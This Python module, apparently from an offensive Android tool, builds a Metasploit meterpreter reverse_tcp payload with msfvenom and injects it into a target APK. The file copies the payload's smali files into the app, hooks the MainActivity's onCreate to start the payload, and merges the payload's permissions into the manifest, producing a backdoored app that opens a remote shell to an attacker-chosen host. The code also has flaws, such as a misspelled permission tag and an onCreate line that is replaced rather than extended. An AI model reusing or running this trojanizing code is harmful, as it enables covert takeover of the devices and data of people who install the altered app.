import logging
import os
import glob
import shutil
import xml.etree.ElementTree as ET

from .apk import Apk
from . import utilities
from .utilities import print_phase, phase_done


class Payload:
    def __init__(self, host, public_host=None):
        self.__payload_apk = None
        self.host = host
        self.public_host = public_host if public_host else host
        self.__generate_payload()

    def __generate_payload(self):
        print_phase('Generating the payload')
        payload_path = os.path.join(os.getcwd(), 'payload.apk')
        command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={self.public_host.ip} LPORT={self.public_host.port} -o {payload_path}"
        logging.info('Generating payload...')
        utilities.run_command(command)
        logging.info('    ... Done')
        self.__payload_apk = Apk(payload_path)
        phase_done()

    def inject(self, apk):
        print_phase("Decompiling the payload's APK")
        self.__payload_apk.decompile()
        phase_done()

        print_phase('Decompiling the target APK')
        apk.decompile()
        phase_done()

        print_phase("Inserting payload's file in target APK")
        metasploit_package = 'com/metasploit/stage'
        files_to_copy = glob.glob(os.path.join(
            self.__payload_apk.decompiled_path, 'smali/', metasploit_package, '*Payload*.smali'
        ))
        copy_dest = os.path.join(apk.decompiled_path, 'smali/', metasploit_package)
        if not os.path.exists(copy_dest):
            logging.info(f"Creating folder: '{copy_dest}'")
            os.makedirs(copy_dest)
        for file in files_to_copy:
            logging.info(f"Copying file '{file}' to '{copy_dest}'")
            shutil.copy(file, copy_dest)
        phase_done()

        print_phase("Detecting target's MainActivity")
        main_activity, main_activity_file = apk.get_main_activity()
        logging.info(f"The main activity is: '{main_activity}'")
        phase_done()

        print_phase("Injecting payload's hook")
        with open(main_activity_file, 'r') as f:
            logging.debug('Reading from Main Activity file')
            main_activity_content = f.read()
        to_find = ';->onCreate(Landroid/os/Bundle;)V'
        to_add = 'invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V'
        logging.debug('Inserting the payload invocation in the Main Activity')
        main_activity_content_lines = main_activity_content.split('\n')
        main_activity_content_lines[:] = [l if to_find not in l else '    '+to_add for l in main_activity_content_lines]
        # 
        # main_activity_content = main_activity_content.replace(to_find, to_find + '\n    ' + to_add)
        main_activity_content = "\n".join(main_activity_content_lines)
        with open(main_activity_file, 'w') as f:
            logging.debug('Writing the Main Activity file')
            f.write(main_activity_content)
        phase_done()

        print_phase('Injecting missing permissions')
        self.__inject_permissions(apk)
        phase_done()

        print_phase('Removing decompiled payload')
        self.__payload_apk.remove_decompiled()
        phase_done()

    def __inject_permissions(self, apk):
        """
        :type apk: Apk
        """
        ANDROID_NAME = '{http://schemas.android.com/apk/res/android}name'

        target_tree = ET.parse(os.path.join(apk.decompiled_path, 'AndroidManifest.xml'))
        target_permissions = [perm.get(ANDROID_NAME) for perm in target_tree.getroot().findall('uses-permission')]
        target_features = [feat.get(ANDROID_NAME) for feat in target_tree.getroot().findall('uses-feature')]

        payload_tree = ET.parse(os.path.join(self.__payload_apk.decompiled_path, 'AndroidManifest.xml'))
        payload_permissions = [perm.get(ANDROID_NAME) for perm in payload_tree.getroot().findall('uses-permission')
                               if perm.get(ANDROID_NAME) not in target_permissions]
        payload_features = [feat.get(ANDROID_NAME) for feat in payload_tree.getroot().findall('uses-feature')
                            if feat.get(ANDROID_NAME) not in target_features]

        for perm in payload_permissions:
            logging.debug(f"Adding permission: '{perm}'")
            permission = ET.SubElement(target_tree.getroot(), 'uses-pemission')
            permission.set(ANDROID_NAME, perm)
        for feat in payload_features:
            logging.debug(f"Adding feature: '{feat}'")
            feature = ET.SubElement(target_tree.getroot(), 'uses-feature')
            feature.set(ANDROID_NAME, feat)
        target_tree.write(os.path.join(apk.decompiled_path, 'AndroidManifest.xml'), xml_declaration=True, encoding='utf-8')
        pass

    def delete(self):
        print_phase("Deleting payload's APK")
        os.remove(self.__payload_apk.full_path)
        phase_done()
